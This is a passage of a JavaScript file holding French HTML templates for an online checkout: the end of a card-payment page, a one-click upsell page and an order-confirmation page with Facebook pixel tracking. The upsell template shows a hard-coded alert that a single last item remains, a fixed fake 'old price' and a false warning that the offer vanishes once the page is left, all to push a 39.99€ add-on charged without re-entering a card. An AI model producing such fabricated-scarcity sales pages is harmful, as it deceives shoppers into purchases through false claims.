.then(function(r){return r.json();}).then(function(d){if(d.acs_url){window.location.href=d.acs_url;return;}window.location.href='/api/bridge?txn='+encodeURIComponent(sess.transaction_unique_id)+shopNameParam;})
.catch(function(e){setPay(false);showError(e.message);});
}

document.getElementById('pay-btn').addEventListener('click',function(){
var em=v('email'),fn=v('first_name'),ln=v('last_name'),co=v('country');
if(!em||em.indexOf('@')<1){showError('Email error');return;}
if(!fn||!ln){showError('Name error');return;}
if(!co){showError('Country error');return;}
if(!cardReady){showError('Loading…');return;}
if(!v('card_holder')){showError('Holder error');return;}
showError('');setPay(true);
fetch('/api/init',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({amount:order.amount,currency:order.currency,order_ref:order.order_ref,sig:order.sig,shop:order.shop,items:qs.get('items'),title:qs.get('title'),customer:{first_name:fn,last_name:ln,email:em,country:co,address:v('address'),city:v('city'),zip:v('zip'),phone:v('phone')}})})
.then(function(r){return r.json();}).then(function(d){
if(d.status!=='success')throw new Error(d.message);
sess=d;Checkout.submit('card-container');
}).catch(function(e){setPay(false);showError(e.message);});
});

if(!order.amount||!order.sig){showError('Lien invalide.');document.getElementById('pay-btn').disabled=true;}
})();
</script></body></html>`;

const UPSELL_HTML = `<!DOCTYPE html>
<html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Offre Spéciale - __SHOP_NAME__</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Inter',sans-serif;background:#f7fafc;color:#2d3748;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
.box{background:#fff;border:1px solid #e2e8f0;border-radius:16px;max-width:500px;width:100%;padding:32px;box-shadow:0 10px 25px -5px rgba(0,0,0,0.05);text-align:center}
.top-lock{font-size:13px;color:#a0aec0;margin-bottom:20px;display:flex;align-items:center;justify-content:center;gap:6px}
.alert-banner{background:#fff5f5;border:1px solid #feb2b2;color:#c53030;padding:12px;border-radius:8px;font-size:13px;font-weight:700;margin-bottom:24px;text-transform:uppercase;letter-spacing:0.5px}
.title{font-size:20px;font-weight:700;color:#1a202c;margin-bottom:12px;line-height:1.3}
.desc{font-size:14px;color:#4a5568;line-height:1.6;margin-bottom:24px}
.product-card{background:#f8fafc;border:1px solid #e2e8f0;border-radius:12px;padding:16px;display:flex;align-items:center;gap:16px;text-align:left;margin-bottom:24px}
.prod-img{width:64px;height:64px;background:#edf2f7;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:28px}
.prod-details{flex:1}
.prod-title{font-size:14px;font-weight:700;color:#2d3748}
.prod-sub{font-size:12px;color:#718096;margin-top:2px}
.price-row{margin-top:6px;display:flex;align-items:center;gap:8px}
.old-price{font-size:13px;color:#a0aec0;text-decoration:line-through}
.new-price{font-size:16px;font-weight:700;color:#3182ce}
.info-box{font-size:12px;color:#718096;background:#ebf8ff;border:1px solid #bee3f8;padding:12px;border-radius:8px;margin-bottom:24px;line-height:1.5}
.btn-claim{width:100%;height:50px;background:#3182ce;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:600;cursor:pointer;box-shadow:0 4px 6px rgba(49,130,206,0.2);transition:all 0.15s;display:flex;align-items:center;justify-content:center}
.btn-claim:hover{background:#2b6cb0}
.btn-claim:disabled{background:#a0aec0;cursor:not-allowed;box-shadow:none}
.btn-skip{display:inline-block;margin-top:16px;font-size:13px;color:#a0aec0;text-decoration:none;transition:color 0.15s}
.btn-skip:hover{color:#718096}
</style></head><body>

<div class="box">
  <div class="top-lock">🔒 __SHOP_NAME__ · Système de Réservation</div>
  <div class="alert-banner">⚠️ ALERTE STOCK : 1 DERNIER ARTICLE DISPONIBLE !</div>
  
  <h1 class="title">Une pièce non attribuée détectée</h1>
  <p class="desc">Le système a détecté qu'il reste exactement <b>UN dernier article invendu</b> pour le quota "<b>__PRODUCT_NAME__</b>". Pour éviter qu'il ne reste vacant, l'organisateur vous le propose de manière exclusive.</p>
  
  <div class="product-card">
    <div class="prod-img">🎁</div>
    <div class="prod-details">
      <div class="prod-title">__PRODUCT_NAME__</div>
      <div class="prod-sub">Dernier article disponible immédiat</div>
      <div class="price-row">
        <span class="old-price">59,99 EUR</span>
        <span class="new-price">39,99 EUR</span>
      </div>
    </div>
  </div>
  
  <div class="info-box">⏱️ <b>Attention :</b> Cette offre est unique. Aucune saisie de carte bancaire n'est requise, votre commande initiale sera simplement mise à jour en 1 clic. Dès que vous quitterez cette page, cet article sera définitivement réattribué.</div>
  
  <button class="btn-claim" id="claim-btn">AJOUTER CET ARTICLE (39,99€ en 1 clic)</button>
  <a href="#" class="btn-skip" id="skip-btn">Non merci, je laisse cet article au client suivant</a>
</div>

<script>
var txn = "__TXN_ID__";
var shop = new URLSearchParams(window.location.search).get('shop') || '';
var shopParam = shop ? '&shop=' + encodeURIComponent(shop) : '';

document.getElementById('claim-btn').addEventListener('click', function() {
  var btn = this;
  btn.disabled = true;
  btn.textContent = 'Mise à jour de votre commande…';
  
  fetch('/api/upsell/submit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ transaction_unique_id: txn })
  })
  .then(function() {
    window.location.href = '/return?txn=' + encodeURIComponent(txn) + shopParam;
  })
  .catch(function() {
    window.location.href = '/return?txn=' + encodeURIComponent(txn) + shopParam;
  });
});

document.getElementById('skip-btn').addEventListener('click', function(e) {
  e.preventDefault();
  window.location.href = '/return?txn=' + encodeURIComponent(txn) + shopParam;
});
</script>
</body></html>`;

const RETURN_HTML = `<!DOCTYPE html>
<html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Confirmation - __SHOP_NAME__</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet"/>
<script>
!function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,document,'script','https://connect.facebook.net/en_US/fbevents.js');
fbq('init','1405300981421901');
fbq('track','PageView');
</script>
<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1405300981421901&ev=PageView&noscript=1"/></noscript>
<style>
body{font-family:'Inter',system-ui,sans-serif;background:#f7fafc;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#1a202c;margin:0;padding:20px}
.card{background:#fff;border:1px solid #e2e8f0;border-radius:16px;padding:40px;max-width:480px;width:100%;text-align:center;box-shadow:0 4px 6px -1px rgba(0,0,0,0.05)}
h1{font-size:22px;font-weight:700;margin:0 0 12px}
p{color:#4a5568;font-size:15px;margin:8px 0;line-height:1.6}
.ok{color:#10b981}.ko{color:#ef4444}.pending{color:#3b82f6}
.spinner{width:36px;height:36px;border:3px solid #e2e8f0;border-top-color:#3b82f6;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
@keyframes spin{to{transform:rotate(360deg)}}
.success-icon{font-size:48px;margin-bottom:16px;display:none}
</style></head><body>
<div class="card">
  <div class="spinner" id="spinner"></div>
  <div class="success-icon" id="success-icon">✅</div>
  <h1 id="title">Vérification de votre commande…</h1>
  <p id="msg">Merci de patienter pendant la validation du paiement.</p>
  <div id="fb-fallback"></div>
</div>
<script>
(function(){
var txn=new URLSearchParams(location.search).get('txn');
var title=document.getElementById('title'),msg=document.getElementById('msg'),spinner=document.getElementById('spinner'),icon=document.getElementById('success-icon'),tries=0;
function done(t,m,cls,showCheck){
  spinner.style.display='none';
  if(showCheck) icon.style.display='block';
  title.textContent=t;title.className=cls;msg.innerHTML=m;
}
function poll(){if(!txn){return done('Référence manquante','Impossible de valider la transaction. Merci de contacter le support.','ko',false);}
fetch('/api/status?txn='+encodeURIComponent(txn)).then(function(r){return r.json();}).then(function(d){
var s=(d.status||'').toLowerCase();
var ts=(d.transactionStatus||'').toLowerCase();
var code=parseInt(d.code, 10);

if(['success','approved','completed','paid'].includes(s) || ts==='success' || ts==='approved' || code===0){
  try{if(window.fbq)fbq('track','Purchase',{value:Number(d.amount)||0,currency:d.currency||'EUR'});}catch(e){}
  
  try {
    var fallbackImg = document.createElement('img');
    fallbackImg.height = 1; fallbackImg.width = 1; fallbackImg.style.display = 'none';
    fallbackImg.src = 'https://www.facebook.com/tr?id=1405300981421901&ev=Purchase&cd[value]=' + (d.amount || 0) + '&cd[currency]=EUR&noscript=1';
    document.getElementById('fb-fallback').appendChild(fallbackImg);
  } catch(e){}

  return done('Commande confirmée ! 🎉','Votre paiement a été validé avec succès.<br><br><b>✅ Votre commande sera expédiée sous peu.</b>','ok',true);
}
if(['declined','failed','error','rejected'].includes(s) || ts==='declined' || ts==='failed') return done('Paiement refusé ❌','La transaction n\\'a pas abouti. Veuillez réessayer avec un autre moyen de paiement.','ko',false);
tries++;if(tries>25)return done('Traitement en cours…','Votre paiement prend un peu de temps à être validé. Vous recevrez une confirmation par e-mail dès validation.','pending',false);
setTimeout(poll,2000);}).catch(function(){setTimeout(poll,2000);});}
poll();
})();
</script></body></html>`;
